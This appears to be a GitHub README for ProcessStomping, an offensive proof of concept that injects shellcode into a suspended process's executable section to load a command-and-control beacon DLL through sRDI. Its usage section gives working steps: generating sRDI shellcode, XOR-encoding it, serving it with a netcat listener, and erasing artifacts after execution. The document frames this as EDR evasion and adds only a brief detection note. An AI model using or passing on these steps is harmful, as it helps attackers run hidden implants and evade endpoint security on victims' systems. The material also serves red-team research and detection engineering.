# ProcessStomping
A variation of ProcessOverwriting to execute shellcode on an executable's section

[![Twitter](https://img.shields.io/twitter/follow/naksyn?label=naksyn&style=social)](https://twitter.com/intent/follow?screen_name=naksyn)

# What is it

For a more detailed explanation you can read my [blog post](https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html)

Process Stomping, is a variation of [hasherezade’s Process Overwriting](https://github.com/hasherezade/process_overwriting) and it has the advantage of writing a shellcode payload on a targeted section instead of writing a whole PE payload over the hosting process address space.

These are the main steps of the ProcessStomping technique:

 1. **CreateProcess** - setting the Process Creation Flag to CREATE_SUSPENDED (0x00000004) in order to suspend the processes primary thread.
 2. **WriteProcessMemory** - used to write each malicious shellcode to the target process section.
 3. **SetThreadContext** - used to point the entrypoint to a new code section that it has written.
 4. **ResumeThread** - self-explanatory.

As an example application of the technique, the PoC can be used with [sRDI](https://github.com/monoxgas/sRDI) to load a beacon dll over an executable RWX section. The following picture describes the steps involved.

![immagine](https://github.com/naksyn/ProcessStomping/assets/59816245/cbc488c4-79ef-4779-9373-8f137b8e97f1)



# Disclaimer

All information and content is provided for educational purposes only. Follow instructions at your own risk. Neither the author nor his employer are responsible for any direct or consequential damage or loss arising from any person or organization.

# Credits

This work has been made possible because of the knowledge and tools shared by Aleksandra Doniec @[hasherezade](https://twitter.com/hasherezade) and [Nick Landers](https://twitter.com/monoxgas).

# Usage

Select your target process and modify global variables accordingly in ProcessStomping.cpp.

Compile the sRDI project making sure that the offset is enough to jump over your generated sRDI shellcode blob and then update the sRDI tools:

`cd \sRDI-master`

`python .\lib\Python\EncodeBlobs.py .\`

Generate a Reflective-Loaderless dll payload of your choice and then generate sRDI shellcode blob:

`python .\lib\Python\ConvertToShellcode.py -b -f "changethedefault" .\noRLx86.dll`

The shellcode blob can then be xored with a key-word and downloaded using a simple socket 

`python xor.py noRLx86.bin noRLx86_enc.bin Bangarang`

Deliver the xored blob upon connection

`nc -vv -l -k -p 8000 -w 30 < noRLx86_enc.bin`

The sRDI blob will get erased after execution to remove unneeded artifacts.


### Demo



https://github.com/naksyn/ProcessStomping/assets/59816245/8d9e1ac2-b47c-41d5-9f0e-1b3fee14ba50



# Caveats

To successfully execute this technique you should select the right target process and use a dll payload that doesn't come with a User Defined Reflective loader.

# Detection opportunities

Process Stomping technique requires starting the target process in a suspended state, changing the thread's entry point, and then resuming the thread to execute the injected shellcode. These are operations that might be considered suspicious if performed in quick succession and could lead to increased scrutiny by some security solutions.
